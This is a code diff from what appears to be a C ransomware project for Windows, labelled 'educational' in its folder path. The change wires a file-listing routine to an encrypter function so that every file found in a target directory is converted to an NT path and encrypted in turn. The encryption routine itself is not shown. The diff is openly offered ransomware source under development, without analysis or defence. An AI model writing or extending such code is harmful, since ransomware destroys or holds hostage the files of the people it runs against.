@@ -5,6 +5,7 @@
 #include <string.h>
 #include <winternl.h>
 #include "include/core/list_files.h"
+#include "core/encrypter.h"
 
 #pragma comment(lib, "ntdll.lib")
 
@@ -152,9 +153,34 @@ int main()
     // snprintf(dir, sizeof(dir), "%s", "C:\\Users\\l3gro\\Documents\\code\\C\\ransomware\\test");
     snprintf(dir, sizeof(dir), "%s", "C:\\Users\\gromenil\\Downloads\\educational-rasomware-main\\test");
     list_files(dir, arr, 0);
+
     for (int i = 1; i <= arr->length; i++)
     {
-        printf("File n%d : %s \n", i, arr->fd[i].cFileName);
+        SYSTEMTIME systemTime;
+
+        /* printf("File n%d : %s \n\t weight : %lu \t last access time : ", i, arr->fd[i].cFileName, (unsigned long)arr->fd[i].nFileSizeHigh);
+        FileTimeToSystemTime(&arr->fd[i].ftLastAccessTime, &systemTime);
+        printf("%02d-%02d-%d %02d:%02d:%02d\n",
+               systemTime.wMonth, systemTime.wDay, systemTime.wYear,
+               systemTime.wHour, systemTime.wMinute, systemTime.wSecond); */
+
+        char *asciiStr = malloc(MAX_PATH);
+        snprintf(asciiStr, MAX_PATH, "\\??\\%s", arr->fd[i].cFileName);
+        int len;
+        wchar_t wideStr[MAX_PATH]; // Assure-toi que le buffer est assez grand
+
+        // Conversion ASCII (CP_ACP) -> UTF-16
+        len = MultiByteToWideChar(CP_UTF8, 0, asciiStr, -1, wideStr, MAX_PATH);
+        if (len == 0)
+        {
+            printf("Erreur de conversion de char* en PCWSTR: %lu\n", GetLastError());
+            return 1;
+        }
+
+        PCWSTR pwstr = wideStr;
+        printf("Start encryption...\n");
+        // pwstr = (PCWSTR)L"\\??\\C:\\Users\\gromenil\\Downloads\\educational-rasomware-main\\test\\coucou.txt";
+        encrypter(pwstr, 1);
     }
 
     // Free the allocated memory for file names
